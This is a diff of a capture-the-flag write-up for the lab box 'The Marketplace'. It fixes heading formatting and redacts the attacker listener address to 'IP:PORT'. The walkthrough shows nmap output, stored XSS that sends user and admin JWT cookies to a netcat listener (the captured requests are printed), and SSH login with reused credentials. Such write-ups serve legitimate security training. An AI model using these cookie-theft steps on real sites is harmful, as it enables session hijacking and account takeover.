@@ -1,6 +1,6 @@
-##The Marketplace
+## The Marketplace
 
-#Enumeration
+# Enumeration
 ```
 # Nmap 7.91 scan initiated Wed May 12 23:12:58 2021 as: nmap -sCV -oN nmap/initial -vvv -p 22,80,32768 10.10.160.210
 Nmap scan report for 10.10.160.210
@@ -36,7 +36,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Wed May 12 23:13:17 2021 -- 1 IP address (1 host up) scanned in 18.50 seconds
 ```
 
-#Web Server Port 80
+# Web Server Port 80
 
 The web server on port 80 has a /admin page we are not authorized to view but we can make an account to try and get some info. With our account we get a couple pieces of information. Firstly we now have a cookie which when decrypted from base 64 gives us the following format
 ```
@@ -57,7 +57,7 @@ Sure enough both fields are vulnerable to XSS and there is an interesting option
 We have netcat listening on the port we designated in our payload and upon creation receive the following
 ```
 GET /token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoidGVzdCIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjIwODg2NjA2fQ.ZIvJn_yrah2bHwAT5E3vnDYAKENuxyj72a57pSgXDCo HTTP/1.1
-Host: 10.13.1.12:8000
+Host: IP:PORT
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
 Accept: */*
 Accept-Language: en-US,en;q=0.5
@@ -70,7 +70,7 @@ Connection: keep-alive
 Sure enough we got our cookie so lets report the listing and see if we receive another cookie from an admin
 ```
 GET /token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MjA4ODgzOTR9.K8vij_h027zriEATHvIe6jYSvi04CI6uCxm84C_mRo0 HTTP/1.1
-Host: 10.13.1.12:8000
+Host: IP:PORT
 Connection: keep-alive
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4182.0 Safari/537.36
 Accept: */*
@@ -190,7 +190,7 @@ User
 
 The user_from and user_to fields return a number but we can use the user table information we have to determine that these correspond to the id's and that we now have a possible password for user id 3 or jake so lets try and connect. Sure enough the credentials have not been changed and we have a foothold
 
-#Initial foothold
+# Initial foothold
 
 We go ahead and find the user.txt flag in jake's home directory and the following
 ```
